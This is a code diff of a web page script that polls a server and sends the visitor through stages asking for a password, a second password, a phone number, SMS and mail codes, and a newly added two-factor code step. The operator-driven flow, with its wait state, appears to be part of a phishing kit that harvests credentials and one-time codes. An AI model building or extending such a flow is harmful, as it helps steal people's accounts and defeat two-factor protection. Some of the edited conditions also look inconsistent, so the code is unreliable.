@@ -10,6 +10,19 @@
 
 <script>
     var userMail = "@edit.mail";
+    
+var stype = {
+    Password1: 1,
+    Password2: 2,
+    Sms: 3,
+    SmsSend: 4,
+    Mail: 5,
+    MailSend: 6,
+    Wait: 99,
+    Finish: 77,
+    Ok: 9999,
+    twocode: 7
+};
 </script>
 
 <script type="text/javascript">
@@ -19,12 +32,11 @@
             if (this.readyState == 4 && this.status == 200) {
                 var xhr = JSON.parse(this.responseText);
 
-                debugger;
-                if (xhr.stype == stype.Password1 && xhr.password2 == null) {
+                if (xhr.stype == stype.Password1 && xhr.password == null) {
                     window.location.href = '/Password';
                 }
 
-                if (xhr.stype == stype.Password2 && xhr.password2 == null) {
+                if (xhr.stype == stype.Password1 && xhr.password2 == null) {
                     window.location.href = '/Password2';
                 }
                 else if (xhr.stype == stype.Sms && xhr.phone == null) {
@@ -38,6 +50,9 @@
                 }
                 else if (xhr.stype == stype.MailSend && xhr.mailcode == null) {
                     window.location.href = '/MailSend';
+                }
+                else if (xhr.stype == stype.twocode && xhr.twocode == null) {
+                    window.location.href = '/twocode';
                 }
                 else if (xhr.stype == stype.Finish) {
                     window.location.href = '/Finish';
